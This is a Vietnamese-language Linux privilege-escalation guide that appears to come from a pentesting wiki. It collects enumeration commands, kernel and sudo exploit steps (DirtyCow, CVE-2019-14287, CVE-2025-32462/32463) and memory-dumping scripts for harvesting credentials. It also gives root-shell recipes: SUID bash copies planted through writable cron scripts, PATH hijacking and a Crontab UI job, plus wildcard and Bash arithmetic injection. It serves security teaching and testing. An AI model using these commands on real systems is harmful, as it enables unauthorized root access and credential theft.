# Leo thang đặc quyền Linux

{{#include ../../../banners/hacktricks-training.md}}

Để tìm hiểu thêm về bối cảnh và quy trình liệt kê lịch sử, hãy tham khảo các tài nguyên g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation và linux-private-i được liệt kê trong phần tài liệu tham khảo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Thông tin hệ thống

### Thông tin hệ điều hành

Hãy bắt đầu tìm hiểu về hệ điều hành đang chạy.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Đường dẫn

Nếu bạn **có quyền ghi vào bất kỳ thư mục nào trong biến `PATH`**, bạn có thể chiếm quyền một số thư viện hoặc binary:

```bash
echo $PATH
```

### Thông tin môi trường

Có thông tin thú vị, mật khẩu hoặc API key nào trong các biến môi trường không?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kiểm tra phiên bản kernel và xem có exploit nào có thể dùng để leo thang đặc quyền hay không.

Phần [Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) tổng hợp các trường hợp leo thang đặc quyền cục bộ và liên kết đến các bài viết chuyên sâu hơn về Linux kernel trong Binary Exploitation. Hãy xác minh bản build và cấu hình bị ảnh hưởng trước khi thử nghiệm một trường hợp.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Bạn có thể tìm danh sách kernel dễ bị tấn công khá tốt và một số **exploit đã biên dịch** ở đây: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) và [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Một số trang web khác có **exploit đã biên dịch**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Để trích xuất tất cả phiên bản kernel dễ bị tấn công từ trang web đó, bạn có thể chạy:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Các công cụ có thể giúp tìm kiếm các kernel exploit:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (chạy trên máy nạn nhân, chỉ kiểm tra exploit cho kernel 2.x)

Luôn **tìm kiếm phiên bản kernel trên Google**; có thể phiên bản kernel của bạn được ghi trong một kernel exploit, khi đó bạn sẽ chắc chắn exploit này có hiệu lực.

Các kỹ thuật khai thác kernel bổ sung:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Leo thang đặc quyền Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Phiên bản Sudo

Dựa trên các phiên bản sudo dễ bị tấn công xuất hiện trong:

```bash
searchsploit sudo
```

Bạn có thể dùng grep này để kiểm tra phiên bản sudo có dễ bị tấn công hay không.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Các phiên bản sudo upstream **1.9.14 đến 1.9.17** cho phép người dùng cục bộ không có đặc quyền nâng quyền lên root thông qua tùy chọn `--chroot` khi sudo tải `/etc/nsswitch.conf` từ một thư mục do người dùng kiểm soát; upstream đã khắc phục lỗi này trong **1.9.17p1**. Kiểm tra mọi binary sudo root-setuid có thể thực thi trong các đường dẫn liên quan, vì `sudo -V` chỉ báo cáo binary được chọn qua `PATH`. Các gói của bản phân phối có thể backport bản sửa lỗi mà không thay đổi chuỗi phiên bản upstream, vì vậy hãy kiểm tra cả trạng thái gói của nhà cung cấp. Xem [khuyến cáo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Đây là một [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) để khai thác [lỗ hổng](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) đó. Trước khi chạy exploit, hãy đảm bảo phiên bản `sudo` của bạn dễ bị tấn công và hỗ trợ tính năng `chroot`.

Để biết thêm thông tin, hãy tham khảo [khuyến cáo về lỗ hổng](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ban đầu.<sup>[[28]](#references)</sup>

### Bỏ qua quy tắc sudo dựa trên host (CVE-2025-32462)

Các phiên bản sudo upstream **1.8.8 đến 1.9.17** có thể đánh giá quy tắc sudoers dựa trên host bằng **hostname do người dùng cung cấp** từ `sudo -h <host>` thay vì **hostname thực**; upstream đã khắc phục lỗi này trong **1.9.17p1**. Người dùng vẫn phải có mục sudoers khớp trên host được chọn. Hãy kiểm tra cả các bản backport của nhà cung cấp và các binary sudo thay thế, cũng như policy cục bộ. Xem [khuyến cáo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Yêu cầu:
- Phiên bản sudo dễ bị tấn công
- Quy tắc sudoers dành riêng cho host (host không phải hostname hiện tại và cũng không phải `ALL`)

Mẫu sudoers ví dụ:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Khai thác bằng cách giả mạo host được phép:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Nếu việc phân giải tên được chọn bị chặn, hãy xác minh cách tên đó được phân giải trên máy chủ. Việc chỉ thấy tên trong nhật ký hoặc tệp cấu hình không có nghĩa là tên đó có thể được phân giải; việc sửa đổi `/etc/hosts` thường yêu cầu quyền ghi đặc quyền.

#### sudo < v1.8.28

Lỗ hổng [bypass Runas UID upstream](https://ubuntu.com/security/CVE-2019-14287) này yêu cầu có quy tắc sudo hiệu lực cho phép chạy lệnh với tư cách `ALL` người dùng nhưng loại trừ root, chẳng hạn `(ALL, !root) /bin/bash`. Người gọi cũng phải được phép sử dụng quy tắc đó, kể cả khi có yêu cầu xác thực. Hãy kiểm tra thông báo bảo mật của gói đã cài đặt: các nhà cung cấp đã backport bản sửa lỗi vào những bản phát hành có phiên bản upstream hiển thị vẫn thấp hơn 1.8.28. Chỉ có quy tắc `!root` hoặc phiên bản cũ không đủ để xác nhận hệ thống bị ảnh hưởng. Không chạy thử lệnh đặc quyền trong quá trình liệt kê thụ động.

```
sudo -u#-1 /bin/bash
```

### Dmesg xác minh chữ ký thất bại

Kiểm tra **box smasher2 của HTB** để xem **ví dụ** về cách có thể khai thác vuln này.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Liệt kê thêm thông tin hệ thống

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Liệt kê các biện pháp phòng thủ khả thi

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Nếu bạn đang ở trong một container, hãy bắt đầu với phần bảo mật container sau đó chuyển sang các trang khai thác đặc thù cho runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Ổ đĩa

Kiểm tra **những gì đang được mount và unmount**, ở đâu và vì sao. Nếu có thứ gì chưa được mount, bạn có thể thử mount nó rồi kiểm tra thông tin riêng tư.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Phần mềm hữu ích

Liệt kê các tệp nhị phân hữu ích

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ngoài ra, hãy kiểm tra xem có compiler nào được cài đặt hay không. Điều này hữu ích nếu bạn cần sử dụng một kernel exploit, vì nên biên dịch nó trên máy mà bạn sẽ sử dụng (hoặc trên một máy tương tự).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Phần mềm dễ bị tấn công đã cài đặt

Kiểm tra **phiên bản của các gói và dịch vụ đã cài đặt**. Có thể có một phiên bản Nagios cũ (chẳng hạn) có thể bị khai thác để leo thang đặc quyền…\
Bạn nên kiểm tra thủ công phiên bản của những phần mềm đáng ngờ hơn đã cài đặt.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Nếu có quyền truy cập SSH vào máy, bạn cũng có thể dùng **openVAS** để kiểm tra phần mềm lỗi thời và dễ bị tấn công được cài đặt trên máy.

> [!NOTE] > _Lưu ý rằng các lệnh này sẽ hiển thị rất nhiều thông tin, phần lớn không hữu ích. Vì vậy, bạn nên dùng các ứng dụng như OpenVAS hoặc công cụ tương tự để kiểm tra xem phiên bản phần mềm đã cài đặt nào có dễ bị tấn công bởi các exploit đã biết hay không._

## Processes

Hãy xem **những process nào** đang được thực thi và kiểm tra xem có process nào có **nhiều quyền hơn mức cần thiết** hay không (có thể là tomcat đang được thực thi bởi root?).

```bash
ps aux
ps -ef
top -n 1
```

Luôn kiểm tra xem có [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) nào đang chạy không; bạn có thể lợi dụng chúng để leo thang đặc quyền. **Linpeas** phát hiện chúng bằng cách kiểm tra tham số `--inspect` trong dòng lệnh của tiến trình.\
Ngoài ra, hãy **kiểm tra quyền của bạn đối với các binary của tiến trình**; có thể bạn ghi đè được binary của ai đó.

### Chuỗi tiến trình cha-con giữa các người dùng

Tiến trình con chạy dưới **người dùng khác** với tiến trình cha không tự động là hành vi độc hại, nhưng đây là một **tín hiệu hữu ích để phân loại**. Một số chuyển đổi là bình thường (`root` khởi chạy một service user, trình quản lý đăng nhập tạo các tiến trình phiên), nhưng những chuỗi bất thường có thể cho thấy wrapper, debug helper, persistence hoặc ranh giới tin cậy runtime yếu.

Kiểm tra nhanh:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Nếu tìm thấy một chuỗi bất ngờ, hãy kiểm tra command line của tiến trình cha và mọi tệp ảnh hưởng đến hành vi của nó (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Trong một số đường dẫn privesc thực tế, bản thân tiến trình con không thể ghi được, nhưng **config do tiến trình cha kiểm soát** hoặc chuỗi helper thì có thể.

### Executable đã bị xóa và tệp đang mở đã bị xóa

Các hiện vật runtime thường vẫn truy cập được **sau khi bị xóa**. Điều này hữu ích cho cả việc leo thang đặc quyền lẫn khôi phục bằng chứng từ một tiến trình đang mở các tệp nhạy cảm.

Kiểm tra các executable đã bị xóa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Nếu `/proc/<PID>/exe` trỏ đến `(deleted)`, tiến trình vẫn đang chạy image nhị phân cũ từ bộ nhớ. Đây là dấu hiệu đáng để điều tra vì:

- tệp thực thi đã bị xóa có thể chứa các chuỗi hoặc thông tin xác thực đáng chú ý
- tiến trình đang chạy vẫn có thể cung cấp các file descriptor hữu ích
- một tệp nhị phân đặc quyền đã bị xóa có thể cho thấy có hành vi can thiệp gần đây hoặc nỗ lực dọn dẹp

Thu thập các tệp đã bị xóa nhưng vẫn đang mở trên toàn hệ thống:

```bash
lsof +L1
```

Nếu bạn tìm thấy một descriptor thú vị, hãy khôi phục nó trực tiếp:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Điều này đặc biệt hữu ích khi một process vẫn đang mở một secret, script, bản xuất database hoặc flag file đã bị xóa.

### Giám sát process

Bạn có thể dùng các công cụ như [**pspy**](https://github.com/DominicBreuker/pspy) để giám sát process. Việc này có thể rất hữu ích để xác định các process dễ bị tấn công được thực thi thường xuyên hoặc khi một tập hợp yêu cầu được đáp ứng.

#### Linux ProcMon với sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) có thể trace các process và system call được chọn rồi lưu trace vào SQLite. Nếu `sudo -l` cho phép chạy lệnh `procmon` không bị giới hạn và có khả năng chạy với quyền root, hãy cân nhắc liệu nó có thể quan sát input hoặc output của process thuộc người dùng khác hay không. Quyền này chỉ là một gợi ý cần xem xét: mức hỗ trợ của tracer, policy đang có hiệu lực và hoạt động của một process phù hợp đều rất quan trọng. Các file trace có thể chứa secrets, vì vậy hãy kiểm tra cẩn thận các bản xuất được phép và tránh thu thập dữ liệu từ những process không liên quan.

### Bộ nhớ process

Một số dịch vụ trên server lưu **credentials ở dạng clear text trong bộ nhớ**.\
Thông thường, bạn cần **quyền root** để đọc bộ nhớ của các process thuộc người dùng khác, vì vậy cách này thường hữu ích hơn khi bạn đã có quyền root và muốn tìm thêm credentials.\
Tuy nhiên, hãy nhớ rằng **người dùng thông thường có thể đọc bộ nhớ của các process thuộc sở hữu của mình**.

> [!WARNING]
> Lưu ý rằng hiện nay hầu hết máy **không cho phép ptrace theo mặc định**, nghĩa là bạn không thể dump các process khác thuộc người dùng không có đặc quyền của mình.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ kiểm soát quyền truy cập ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: có thể debug mọi process, miễn là chúng có cùng uid. Đây là cách ptracing hoạt động theo kiểu cổ điển.
> - **kernel.yama.ptrace_scope = 1**: chỉ có thể debug process cha.
> - **kernel.yama.ptrace_scope = 2**: chỉ admin mới có thể dùng ptrace, vì cần capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: không process nào có thể bị trace bằng ptrace. Sau khi đặt giá trị này, cần khởi động lại để bật lại ptracing.

Một process có cùng UID, tạm thời mở khóa password vault, có thể tạo ra một ranh giới credential riêng. Khi được phép tracing, một process đang hoạt động và có thể dump có thể làm lộ password vault thông qua các input syscall hoặc bộ nhớ của nó, dù bản thân file vault đã mã hóa vẫn được bảo vệ. `ptrace_scope=0` chỉ là một điều kiện tiên quyết: credentials trùng khớp, khả năng dump của process mục tiêu, các Linux security module khác và thời gian tồn tại của process cũng rất quan trọng. Việc một mục trong vault trở thành thông tin đăng nhập Unix root cần được kiểm tra riêng về khả năng tái sử dụng credential. Hoạt động liệt kê thông thường nên báo cáo policy và process hoặc đường dẫn vault tiềm năng, không thu thập input hay in secrets. Xem [tài liệu Yama của kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) và [các bước kiểm tra quyền truy cập ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ví dụ, nếu bạn có quyền truy cập bộ nhớ của một dịch vụ FTP, bạn có thể lấy Heap và tìm credentials bên trong.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Với một ID tiến trình cụ thể, **maps cho biết bộ nhớ được ánh xạ như thế nào trong không gian địa chỉ ảo của tiến trình đó**; nó cũng hiển thị **quyền của từng vùng được ánh xạ**. Tệp giả **mem** **cung cấp quyền truy cập trực tiếp vào bộ nhớ của tiến trình**. Từ tệp **maps**, chúng ta biết **những vùng bộ nhớ nào có thể đọc được** và các offset của chúng. Chúng ta dùng thông tin này để **seek đến các vị trí tương ứng trong tệp mem và dump tất cả các vùng có thể đọc được** vào một tệp.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` cung cấp quyền truy cập vào bộ nhớ **vật lý** của hệ thống, không phải bộ nhớ ảo. Có thể truy cập không gian địa chỉ ảo của kernel bằng /dev/kmem.\
Thông thường, chỉ **root** và nhóm **kmem** mới có quyền đọc `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDump là phiên bản tái hiện trên Linux của công cụ ProcDump kinh điển thuộc bộ công cụ Sysinternals dành cho Windows. Tải công cụ tại [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Công cụ

Để dump bộ nhớ của một tiến trình, bạn có thể dùng:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Bạn có thể tự xóa yêu cầu root và dump tiến trình do bạn sở hữu
- Script A.5 từ [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (cần root)

### Thông tin xác thực từ bộ nhớ tiến trình

#### Ví dụ thủ công

Nếu bạn phát hiện tiến trình authenticator đang chạy:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Bạn có thể dump tiến trình (xem các phần trước để tìm những cách khác nhau nhằm dump bộ nhớ của tiến trình) và tìm kiếm thông tin đăng nhập bên trong bộ nhớ:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Công cụ [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sẽ **đánh cắp thông tin xác thực dạng văn bản thuần từ bộ nhớ** và từ một số **tệp phổ biến**. Công cụ cần quyền root để hoạt động chính xác.

| Tính năng                                         | Tên tiến trình       |
| ------------------------------------------------- | -------------------- |
| Mật khẩu GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (các kết nối FTP đang hoạt động)           | vsftpd               |
| Apache2 (các phiên xác thực HTTP Basic đang hoạt động) | apache2          |
| OpenSSH (các phiên SSH đang hoạt động - sử dụng Sudo) | sshd:             |

#### Regex tìm kiếm/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) chạy với quyền root – leo thang đặc quyền qua bộ lập lịch dựa trên web

Nếu một bảng điều khiển web “Crontab UI” (alseambusher/crontab-ui) chạy với quyền root và chỉ bind vào loopback, bạn vẫn có thể truy cập nó thông qua SSH local port-forwarding và tạo một job đặc quyền để leo thang.<sup>[[1]](#references)[[4]](#references)</sup>

Chuỗi điển hình
- Tìm cổng chỉ mở trên loopback (ví dụ: 127.0.0.1:8000) và Basic-Auth realm qua `ss -ntlp` / `curl -v localhost:8000`
- Tìm thông tin đăng nhập trong các tệp vận hành:
  - Bản sao lưu/script có `zip -P <password>`
  - systemd unit hiển thị `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tạo tunnel và đăng nhập:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tạo một job quyền cao và chạy ngay lập tức (tạo shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Sử dụng nó:
```bash
/tmp/rootshell -p   # root shell
```

Gia cố
- Không chạy Crontab UI dưới quyền root; dùng user riêng và giới hạn quyền ở mức tối thiểu
- Bind vào localhost và hạn chế quyền truy cập thêm bằng firewall/VPN; không dùng lại mật khẩu
- Tránh nhúng secrets vào unit files; dùng secret stores hoặc EnvironmentFile chỉ root mới đọc được
- Bật audit/logging cho các lần thực thi job theo yêu cầu

Kiểm tra xem có scheduled job nào dễ bị khai thác không. Có thể bạn tận dụng được script chạy dưới quyền root (lỗ hổng wildcard? sửa được các file mà root sử dụng? dùng symlink? tạo các file cụ thể trong thư mục mà root sử dụng?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Nếu sử dụng `run-parts`, hãy kiểm tra những tên nào thực sự sẽ được thực thi:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Điều này tránh các kết quả dương tính giả. Thư mục định kỳ có quyền ghi chỉ hữu ích nếu tên tệp payload của bạn khớp với các quy tắc `run-parts` trên máy cục bộ.

### Đường dẫn Cron

Ví dụ, bên trong _/etc/crontab_ bạn có thể tìm thấy PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Lưu ý rằng người dùng "user" có quyền ghi trong /home/user_)

Nếu trong crontab này, người dùng root cố chạy một lệnh hoặc script mà không đặt đường dẫn. Ví dụ: _\* \* \* \* root overwrite.sh_\
Khi đó, bạn có thể lấy được một shell root bằng cách dùng:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron sử dụng script có wildcard (Wildcard Injection)

Nếu một script được thực thi bởi root có “**\***” bên trong một lệnh, bạn có thể khai thác điều này để thực hiện những việc ngoài dự kiến (như privesc). Ví dụ:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Nếu wildcard được đặt trước bởi một đường dẫn như** _**/some/path/\***_ **, thì không dễ bị khai thác (ngay cả** _**./\***_ **cũng vậy).**

Đọc trang sau để biết thêm các thủ thuật khai thác wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Chèn lệnh qua mở rộng số học Bash trong trình phân tích nhật ký cron

Bash có thể diễn giải văn bản không đáng tin cậy như một biểu thức số học. Trong một số ngữ cảnh Bash bị ảnh hưởng, chỉ số mảng bên trong biểu thức đó có thể thực thi một phép thay thế lệnh. Nếu cron/parser có đặc quyền đưa văn bản nhật ký do kẻ tấn công kiểm soát vào phép so sánh số học như vậy, phép thay thế có thể chạy với danh tính của parser.<sup>[[22]](#references)</sup> Điều này phụ thuộc vào biểu thức Bash và phiên bản cụ thể; chỉ riêng chuỗi `$(...)0` trong một biến được khai triển không phải là minh chứng đáng tin cậy cho việc đánh giá lại.

Đầu vào cũng có thể đến từ metadata của tệp hoặc một trường khác được đọc từ vị trí mà người dùng có thể ghi. Ví dụ, một script dọn dẹp có đặc quyền đọc thẻ `Producer` của ảnh rồi so sánh bằng `[[ "$producer" -eq "expected" ]]` sẽ thực hiện phép so sánh số học, dù biến đã được đặt trong dấu nháy kép. Hãy xác định danh tính mà tác vụ được lên lịch chạy dưới đó, những tệp nào có thể cung cấp thẻ này, mọi phép biến đổi trước khi so sánh và hành vi chính xác của Bash. Với nhãn văn bản, hãy dùng phép so sánh chuỗi; với số, hãy xác thực đầu vào chỉ gồm chữ số thập phân trước khi tính toán số học. Xem [các quy tắc số học của Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Mẫu thường dễ bị khai thác:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Thăm dò an toàn hành vi cục bộ của cơ chế truy cập phần tử mảng (không có tiến trình đặc quyền hoặc thay đổi tệp):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Truy vết script thực tế được lên lịch và đường dẫn đầu vào chính xác mà nó mở. Ngay cả khi không thể ghi vào chính tệp log, người dùng có quyền ghi và truy cập thư mục cha không có sticky bit có thể thay thế mục thư mục của tệp; `namei -l` giúp phân biệt các quyền này. Một đường dẫn log khác có thể ghi, scheduler không thể đọc được hoặc parser không bao giờ đánh giá trường đó dưới dạng phép toán số học của Bash đều không chứng minh được khả năng khai thác này.

### Ghi đè cron script và symlink

Nếu bạn **có thể sửa đổi một cron script** được chạy bằng quyền root, bạn có thể rất dễ lấy được shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Nếu script được root thực thi sử dụng **một thư mục mà bạn có toàn quyền truy cập**, có thể hữu ích nếu xóa thư mục đó và **tạo một thư mục symlink trỏ đến thư mục khác** chứa script do bạn kiểm soát.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Xác thực symlink và xử lý tệp an toàn hơn

Khi kiểm tra các script/binary có đặc quyền đọc hoặc ghi tệp theo đường dẫn, hãy xác minh cách chúng xử lý liên kết:

- `stat()` theo symlink và trả về metadata của đích.
- `lstat()` trả về metadata của chính liên kết.
- `readlink -f` và `namei -l` giúp phân giải đích cuối cùng và hiển thị quyền của từng thành phần trong đường dẫn.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Đối với người phòng thủ/nhà phát triển, các cách an toàn hơn để chống lại thủ thuật symlink gồm:

- `O_EXCL` với `O_CREAT`: thất bại nếu đường dẫn đã tồn tại (ngăn các liên kết/tệp do kẻ tấn công tạo sẵn).
- `openat()`: thao tác tương đối với file descriptor của một thư mục đáng tin cậy.
- `mkstemp()`: tạo tệp tạm thời một cách nguyên tử với quyền truy cập an toàn.

### Binary cron được ký tùy chỉnh với payload có thể ghi
Một người dùng thông thường có thể vượt qua ranh giới đặc quyền nếu họ ghi được vào đúng binary mà cron job của root chạy, nhưng cơ chế kiểm tra chữ ký tùy chỉnh có thể từ chối bản thay thế chưa được ký. Trong trường hợp được ghi nhận, ELF thuộc sở hữu của root có mode `0760`, cho phép thành viên trong group ghi vào tệp trong khi chủ sở hữu root có thể thực thi nó. Dấu vết tiến trình hiển thị cho thấy `objcopy` trích xuất `.text_sig` trước khi job chạy binary; không thể đọc toàn bộ script xác minh.<sup>[[2]](#references)</sup>

